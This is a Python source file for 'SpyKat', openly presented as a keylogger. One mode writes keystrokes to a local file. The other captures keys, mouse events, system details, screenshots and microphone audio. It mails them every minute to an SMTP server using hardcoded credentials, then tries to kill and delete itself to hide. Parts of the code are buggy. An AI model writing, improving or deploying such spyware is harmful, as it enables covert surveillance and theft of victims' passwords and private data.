import pyfiglet
import pynput
import os
from pynput.keyboard import Key, Listener
from termcolor import colored
print(colored("""

  ██████  ██▓███ ▓██   ██▓ ██ ▄█▀▄▄▄     ▄▄▄█████▓
▒██    ▒ ▓██░  ██▒▒██  ██▒ ██▄█▒▒████▄   ▓  ██▒ ▓▒
░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░▓███▄░▒██  ▀█▄ ▒ ▓██░ ▒░
  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░▓██ █▄░██▄▄▄▄██░ ▓██▓ ░ 
▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░▒██▒ █▄▓█   ▓██▒ ▒██▒ ░ 
▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ ▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░   
░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ ░ ░▒ ▒░ ▒   ▒▒ ░   ░    
░  ░  ░  ░░       ▒ ▒ ░░  ░ ░░ ░  ░   ▒    ░      
      ░           ░ ░     ░  ░        ░  ░        
                  ░ ░                             
                  
                             ~ By Anuj Maheshwari
                  """, 'blue', attrs = ['bold']))

# BANNER SPYKAT

print(colored('             ___________              ', 'yellow', attrs = ['bold']))
print(colored('            /           \             ', 'yellow', attrs = ['bold']))
print(colored('      _____/_____________\_____       ', 'yellow', attrs = ['bold']))
print(colored('           |             |            ', 'yellow', attrs = ['bold']))
print(colored('           |   @     @   |            ', 'yellow', attrs = ['bold']))
print(colored('            \     ^     /             ', 'yellow', attrs = ['bold']))
print(colored('          ___\_________/___           ', 'yellow', attrs = ['bold']))
print(colored('         /   /         \   \          ', 'yellow', attrs = ['bold']))
print(colored('        /  ______________   \         ', 'yellow', attrs = ['bold']))
print(colored('       /  |              |   \        ', 'yellow', attrs = ['bold']))
print(colored('      /   |              |    \       ', 'yellow', attrs = ['bold']))
print(colored('     /    |     d3vil    |     \      ', 'yellow', attrs = ['bold']))
print(colored('    /  \  |              |  /   \     ', 'yellow', attrs = ['bold']))
print(colored('   /\   \ |______________| /    /\    ', 'yellow', attrs = ['bold']))
print(colored('  /  \   \|______________|/    /  \   ', 'yellow', attrs = ['bold']))
print(colored('         By ANUJ MAHESHWARI           ', 'green', attrs = ['bold']))


print("\n")
print(' SpyKat is a simple and powerful Python keylogger that is able to log keystrokes, log mouse clicks, take screenshots and more! \n This tool will store the logs either in the local file or send the logs to the email in a given period. ')
# print(colored(' You are under survilience ' , attrs=['bold', 'dark']))
print(f'[1]\u001b[33m ' + colored('Default Method (stores and captured key in a text file) ', 'green', attrs=['bold', 'dark']) +'\u001b[0m')
print(f'[2]\u001b[33m ' + colored('Advanced Method (forward all the captured keys to a mail address) ', 'green', attrs=['bold', 'dark']) +'\u001b[0m \n')

# print(' Press the number to select the method you want: ') 
x = str(input(' Press the number to select the method you want: ')) 


def funone():
    print(colored(' You are under survilience ', attrs=['bold', 'dark']))
    count = 0
    keys = []

    def on_press(key):
        # global keys, count
        count = 0
        keys = []
        keys.append(key)
        count += 1
        print("{0} pressed".format(key))

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open('log.txt', "a") as f:
            # str(input('Enter the path to store the keys:'))
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def funtwo():
    print(colored(' You are under survilience ', attrs=['bold', 'dark']))
    try:
    	import logging
    	import os
    	import platform
    	import smtplib
    	import socket
    	import threading
    	import wave
    	import pyscreenshot
    	import sounddevice as sd
    	from pynput import keyboard
    	from pynput.keyboard import Listener
    	from email import encoders
    	from email.mime.base import MIMEBase
    	from email.mime.multipart import MIMEMultipart
    	from email.mime.text import MIMEText
    	import glob
    except ModuleNotFoundError:
    	from subprocess import call
    	modules = ["pyscreenshot","sounddevice","pynput"]
    	call("pip install " + ' '.join(modules), shell=True)


    finally:
    	EMAIL_ADDRESS = "b6508056081687"
    	EMAIL_PASSWORD = "805e14083e1d7d"
    	SEND_REPORT_EVERY = 60 # as in seconds
    	class KeyLogger:
            def __init__(self, time_interval, email, password):
                self.interval = time_interval
                self.log = "KeyLogger Started..."
                self.email = email
                self.password = password

            def appendlog(self, string):
                self.log = self.log + string

            def on_move(self, x, y):
                current_move = logging.info("Mouse moved to {} {}".format(x, y))
                self.appendlog(current_move)

            def on_click(self, x, y):
                current_click = logging.info("Mouse moved to {} {}".format(x, y))
                self.appendlog(current_click)

            def on_scroll(self, x, y):
                current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
                self.appendlog(current_scroll)

            def save_data(self, key):
                try:
                    current_key = str(key.char)
                except AttributeError:
                    if key == key.space:
                        current_key = "SPACE"
                    elif key == key.esc:
                        current_key = "ESC"
                    else:
                        current_key = " " + str(key) + " "

                self.appendlog(current_key)

            def send_mail(self, email, password, message):
                sender = "Private Person <from@example.com>"
                receiver = "A Test User <to@example.com>"

                m = f"""\
                Subject: main Mailtrap
                To: {receiver}
                From: {sender}

                Keylogger by anuj\n"""

                m += message
                with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                    server.login(email, password)
                    server.sendmail(sender, receiver, message)

            def report(self):
                self.send_mail(self.email, self.password, "\n\n" + self.log)
                self.log = ""
                timer = threading.Timer(self.interval, self.report)
                timer.start()

            def system_information(self):
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                plat = platform.processor()
                system = platform.system()
                machine = platform.machine()
                self.appendlog(hostname)
                self.appendlog(ip)
                self.appendlog(plat)
                self.appendlog(system)
                self.appendlog(machine)

            def microphone(self):
                fs = 44100
                seconds = SEND_REPORT_EVERY
                obj = wave.open('sound.wav', 'w')
                obj.setnchannels(1)  # mono
                obj.setsampwidth(2)
                obj.setframerate(fs)
                myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
                obj.writeframesraw(myrecording)
                sd.wait()

                self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

            def screenshot(self):
                img = pyscreenshot.grab()
                self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)

            def run(self):
                keyboard_listener = keyboard.Listener(on_press=self.save_data)
                with keyboard_listener:
                    self.report()
                    keyboard_listener.join()
                with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                    mouse_listener.join()
                if os.name == "nt":
                    try:
                        pwd = os.path.abspath(os.getcwd())
                        os.system("cd " + pwd)
                        os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                        print('File was closed.')
                        os.system("DEL " + os.path.basename(__file__))
                    except OSError:
                        print('File is close.')

                else:
                    try:
                        pwd = os.path.abspath(os.getcwd())
                        os.system("cd " + pwd)
                        os.system('pkill leafpad')
                        os.system("chattr -i " +  os.path.basename(__file__))
                        print('File was closed.')
                        os.system("rm -rf" + os.path.basename(__file__))
                    except OSError:
                        print('File is close.')
                        
            def on_release(key):
                if key == Key.esc:
                    return False

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()




try:
	x = int(x)
	if x == 1:
    		funone()
	elif x == 2:
    		funtwo()
	else:
    		print(colored('Number not in the list', 'red', attrs = ['bold']))

except:
	print('Please enter a valid integer value.')
